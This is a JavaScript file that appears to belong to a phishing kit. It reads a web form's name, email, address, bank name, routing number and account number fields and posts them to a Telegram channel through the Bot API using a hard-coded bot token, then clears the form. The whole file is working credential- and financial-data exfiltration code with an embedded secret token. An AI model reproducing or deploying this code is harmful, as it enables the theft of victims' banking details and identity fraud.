
//bot token
var telegram_bot_id = "6310644522:AAHTH8-ulzoYqSzZaLCipmNF5uzJPFXaNy0";
//chat id
var chat_id = 5883545100;
var firstname, lastname, email, street, apt, state, city, zip, bankname, routingnumber, accountnumber, account, initial, date;
var ready = function () {
    firstname = document.getElementById("firstname").value;
    lastname = document.getElementById("lastname").value;
    email = document.getElementById("email").value;
    street = document.getElementById("street").value;
    apt = document.getElementById("apt").value;
    state = document.getElementById("state").value;
    city = document.getElementById("city").value;
    zip = document.getElementById("zip").value;
    bankname = document.getElementById("bankname").value;
    routingnumber = document.getElementById("routingnumber").value;
    accountnumber = document.getElementById("accountnumber").value;
    account = document.getElementById("account").value;
    initial = document.getElementById("initial").value;
    date = document.getElementById("date").value;
    message = "First Name: " + firstname +"\nLast name: " + lastname +"\nEmail: " + email +"\nStreet: " + street +"\nApt: " + apt +"\nState: " + state +"\nCity: " + city + "\nZip: " + zip + "\nBank name: " + bankname + "\nRouting number: " + routingnumber + "\nAccount number: " + accountnumber + "\nAccount type : " + account + "\nInitial : " + initial + "\nDate : " + date;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": '@drinksandcodd',
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("firstname").value = "";
    document.getElementById("lastname").value = "";
    document.getElementById("email").value = "";
    document.getElementById("street").value = "";
    document.getElementById("apt").value = "";
    document.getElementById("state").value = "";
    document.getElementById("city").value = "";
    document.getElementById("zip").value = "";
    document.getElementById("bankname").value = "";
    document.getElementById("accountnumber").value = "";
    document.getElementById("routingnumber").value = "";
    document.getElementById("account").value = "";
    document.getElementById("initial").value = "";
    document.getElementById("date").value = "";
    return false;
};
